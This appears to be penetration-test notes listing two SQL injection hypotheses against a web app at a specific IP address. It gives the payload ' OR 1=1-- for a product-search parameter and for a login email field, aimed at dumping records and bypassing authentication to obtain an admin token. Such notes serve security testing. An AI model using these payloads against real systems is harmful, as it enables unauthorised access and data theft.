# Injection Attack Hypotheses

**Target:** http://54.146.141.88:3000

## Hypotheses

### Hypothesis 1
**Endpoint:** GET /rest/products/search?q=
**Parameter:** q
**Payload:** `' OR 1=1--`
**Expected Result:** Returns all products instead of empty results, confirming boolean-based SQL injection via direct string concatenation in routes/search.ts

### Hypothesis 2
**Endpoint:** POST /rest/user/login
**Parameter:** email (JSON body)
**Payload:** `' OR 1=1--`
**Expected Result:** Authentication bypass returning valid JWT token for admin account without correct credentials
